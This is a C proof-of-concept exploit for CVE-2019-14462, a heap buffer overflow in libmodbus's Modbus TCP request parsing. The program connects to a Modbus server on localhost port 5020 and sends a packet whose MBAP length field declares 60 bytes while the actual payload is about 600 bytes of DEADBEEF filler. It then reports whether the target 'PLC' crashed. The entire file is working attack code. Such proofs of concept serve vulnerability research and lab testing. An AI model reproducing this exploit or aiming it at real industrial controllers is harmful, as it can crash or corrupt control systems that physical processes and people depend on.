#include <errno.h>
#include <modbus.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define TARGET_IP "127.0.0.1"
#define TARGET_PORT 5020
// Declare a short length (60 bytes) while actually sending 600 bytes to trigger the parser bug.
#define DECLARED_LENGTH 60
#define ACTUAL_PDU_LENGTH 600
#define QUERY_SIZE (7 + ACTUAL_PDU_LENGTH)

static int send_all(int fd, const uint8_t *buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        ssize_t rc = send(fd, buf + total, len - total, 0);
        if (rc == -1) {
            return -1;
        }
        total += (size_t)rc;
    }
    return 0;
}

int main(void) {
    printf("==============================================\n");
    printf("  CVE-2019-14462 Exploit (Heap Buffer Overflow)\n");
    printf("==============================================\n");
    printf("\n");
    printf("[*] Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("[*] Attack: Declare %d bytes, send %d bytes\n", DECLARED_LENGTH, QUERY_SIZE);
    printf("[*] Overflow: %d bytes beyond declared length\n", QUERY_SIZE - 7 - DECLARED_LENGTH + 1);
    printf("\n");

    printf("[1] Creating Modbus TCP context...\n");
    modbus_t *ctx = modbus_new_tcp(TARGET_IP, TARGET_PORT);
    if (!ctx) {
        fprintf(stderr, "    FAILED: modbus_new_tcp failed\n");
        return EXIT_FAILURE;
    }
    printf("    OK\n");

    printf("[2] Connecting to target...\n");
    if (modbus_connect(ctx) == -1) {
        fprintf(stderr, "    FAILED: %s\n", modbus_strerror(errno));
        modbus_free(ctx);
        return EXIT_FAILURE;
    }
    printf("    OK - Connected!\n");

    printf("[3] Building malicious packet...\n");
    uint8_t query[QUERY_SIZE];
    memset(query, 0, sizeof(query));

    // Build MBAP header followed by the crafted PDU payload.
    query[0] = 0x00; // Transaction ID high
    query[1] = 0x01; // Transaction ID low
    query[2] = 0x00; // Protocol ID high
    query[3] = 0x00; // Protocol ID low
    query[4] = (DECLARED_LENGTH >> 8) & 0xFF; // Length high (declared)
    query[5] = DECLARED_LENGTH & 0xFF;        // Length low (declared)
    query[6] = 0x01; // Unit ID
    query[7] = 0x03; // Function code (Read Holding Registers)
    query[8] = 0x00; // Start address high
    query[9] = 0x00; // Start address low
    query[10] = 0x00; // Quantity high
    query[11] = 0x10; // Quantity low (16 registers)

    /* Fill the payload with a repeating marker pattern (DE AD BE EF) so the
     * overflow is easy to spot when examining memory in gdb. */
    static const uint8_t marker[] = {0xDE, 0xAD, 0xBE, 0xEF};
    for (size_t i = 12; i < sizeof(query); ++i) {
        query[i] = marker[(i - 12) % sizeof(marker)];
    }

    printf("    MBAP Header: ");
    for (int i = 0; i < 7; i++) {
        printf("%02X ", query[i]);
    }
    printf("\n");
    printf("    Length field claims: %d bytes\n", DECLARED_LENGTH);
    printf("    Actual payload size: %d bytes\n", QUERY_SIZE);
    printf("    Marker pattern: 0xDEADBEEF (repeating)\n");
    printf("    OK\n");

    int sock = modbus_get_socket(ctx);
    if (sock == -1) {
        fprintf(stderr, "    FAILED: modbus_get_socket failed\n");
        modbus_close(ctx);
        modbus_free(ctx);
        return EXIT_FAILURE;
    }

    printf("[4] Sending malicious packet (%d bytes)...\n", QUERY_SIZE);
    if (send_all(sock, query, sizeof(query)) == -1) {
        fprintf(stderr, "    FAILED: %s\n", strerror(errno));
        modbus_close(ctx);
        modbus_free(ctx);
        return EXIT_FAILURE;
    }
    printf("    OK - Payload sent!\n");

    printf("[5] Waiting for response...\n");
    uint8_t response[260];
    ssize_t received = recv(sock, response, sizeof(response), 0);
    if (received == -1) {
        printf("    recv() returned error: %s\n", strerror(errno));
        printf("\n");
        printf("[!] Server may have CRASHED (no response)\n");
    } else if (received == 0) {
        printf("    Connection closed by server (0 bytes)\n");
        printf("\n");
        printf("[!] Server CRASHED - connection terminated!\n");
    } else {
        printf("    Received %zd bytes:\n    ", received);
        for (ssize_t i = 0; i < received; ++i) {
            printf("%02x ", response[i]);
            if (i % 16 == 15) {
                printf("\n    ");
            }
        }
        if (received % 16 != 0) {
            printf("\n");
        }
        printf("\n");
        printf("[?] Server responded - may not be vulnerable or attack blocked\n");
    }

    printf("\n==============================================\n");
    printf("  Attack complete. Check PLC terminal.\n");
    printf("==============================================\n");

    modbus_close(ctx);
    modbus_free(ctx);
    return EXIT_SUCCESS;
}
